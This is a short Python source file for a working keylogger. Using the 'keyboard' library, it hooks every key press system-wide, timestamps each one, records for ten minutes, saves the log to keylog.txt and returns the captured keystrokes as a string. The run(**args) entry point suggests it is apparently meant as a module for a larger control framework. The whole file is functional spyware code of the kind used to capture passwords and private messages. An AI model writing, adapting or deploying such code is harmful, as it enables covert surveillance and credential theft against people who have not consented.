import keyboard
import time
import threading


class KeyLogger:
    def __init__(self):
        self.log = []
        self.stop_event = threading.Event()


    def log_key(self, event):
        # Log key with a timestamp for better context
        self.log.append((event.name, time.strftime('%Y-%m-%d %H:%M:%S')))


    def start(self):
        keyboard.on_press(self.log_key)


    def stop(self):
        keyboard.unhook_all()


    def save_to_file(self, filename='keylog.txt'):
        # Save logs to a file
        with open(filename, 'w') as f:
            for key, timestamp in self.log:
                f.write(f'{timestamp}: {key}\n')


def run(**args):
    logger = KeyLogger()
    logger.start()
    timeout = time.time() + 60 * 10  # 10 minutes


    try:
        while not logger.stop_event.is_set() and time.time() < timeout:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nKeylogging interrupted by user.")
    finally:
        logger.stop()
        logger.save_to_file()
        print("Keylogging stopped. Log saved to 'keylog.txt'.")
    return ' '.join(key for key, _ in logger.log)

